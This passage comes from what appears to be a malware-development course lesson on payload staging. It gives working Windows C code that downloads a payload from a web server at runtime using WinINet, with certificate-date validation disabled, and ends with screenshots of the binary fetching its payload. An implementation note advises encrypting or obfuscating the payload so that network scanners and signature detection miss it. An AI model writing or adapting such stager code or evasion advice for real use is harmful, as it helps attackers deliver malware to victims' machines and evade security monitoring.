		printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		return FALSE;
	}

	while (TRUE) {

		// Reading 1024 bytes to the temp buffer
		// InternetReadFile will read less bytes in case the final chunk is less than 1024 bytes
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
			printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
			return FALSE;
		}

		// Updating the size of the total buffer
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			return FALSE;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, &#x27;\0&#x27;, dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop
		if (dwBytesRead &lt; 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}

	// Clean up
	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);

	return TRUE;
}

</code></pre><h3 id="3c31e35a-9235-46f8-a5b0-70cef4e2210a" class=""><strong>Payload Staging Final - Code Snippet</strong></h3><p id="a02eb3f0-0443-4d83-9b65-d8decd67ff72" class="">The <code>GetPayloadFromUrl</code> function now takes 3 parameters:</p><ul id="93ce474a-66d7-41dd-92b1-fa738ba36601" class="bulleted-list"><li style="list-style-type:disc"><code>szUrl</code>The URL of the payload.</li></ul><ul id="a4f9355b-4b4f-422d-8d4b-dde40bd7b91b" class="bulleted-list"><li style="list-style-type:disc"><code>pPayloadBytes</code> - Returns as the base address of the buffer containing the payload.</li></ul><ul id="7508ffa8-4da8-4f2f-9b99-765649e50e54" class="bulleted-list"><li style="list-style-type:disc"><code>sPayloadSize</code> - The total size of the payload that was read.</li></ul><p id="94e93ea9-95d2-4b90-9186-2127cb0c0667" class="">The function will also correctly closes the HTTP/S connections once the retrieval of the payload has been completed.</p><pre id="0bc40950-3824-4b20-99d3-0669efa407d0" class="code code-wrap"><code>BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE            = TRUE;

	HINTERNET	hInternet         = NULL,
			    hInternetFile     = NULL;

	DWORD		dwBytesRead       = NULL;

	SIZE_T		sSize             = NULL;
	PBYTE		pBytes            = NULL,
			    pTmpByte          = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL){
		printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL){
		printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL){
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE){

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
			printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, &#x27;\0&#x27;, dwBytesRead);

		if (dwBytesRead &lt; 1024){
			break;
		}
	}



	*pPayloadBytes = pBytes;
	*sPayloadSize  = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}
</code></pre><h3 id="f1cfbc1e-fa29-4b70-8bc6-a223a78b8b11" class=""><strong>Implementation Note</strong></h3><p id="d79c8ece-6cff-4ace-af70-b089eb4b9c5d" class="">In this module, the payload was retrieved from the internet as raw binary data, without any encryption or obfuscation. While this approach may evade basic security measures that analyze the binary code for signs of malicious activity, it&#x27;ll get flagged by network scanning tools. Therefore, if the payload is not encrypted, packets captured during the transmission may contain identifiable snippets of the payload. This could expose the payload&#x27;s signature, leading to the implementation process being flagged.</p><p id="ecb6c046-7b1c-4c87-a0db-1a5dc9708ea7" class="">In real-world scenarios, it is always advised to encrypt or obfuscate the payload even if it&#x27;s fetched at runtime.</p><h3 id="06498e8d-5de5-4904-ae08-fca9bcbf6244" class=""><strong>Running The Final Binary</strong></h3><p id="e1559506-e60a-49bd-ae79-436a190ef3c6" class="">The binary successfully fetches the payload.</p><figure id="5aaf1cb9-c78d-43e7-b337-02d6da020498" class="image"><a href="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/staging-demo-1.png"><img style="width:1085px" src="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/staging-demo-1.png"/></a></figure><p id="1bfb4fbf-451d-4ca6-b122-ffc98b1dec1e" class="">The connections are closed once execution is completed.</p><figure id="e698cd3b-5919-4946-9f76-c1639634f16a" class="image"><a href="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/staging-demo-2.png"><img style="width:1188px" src="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/staging-demo-2.png"/></a></figure></div></article></body></html>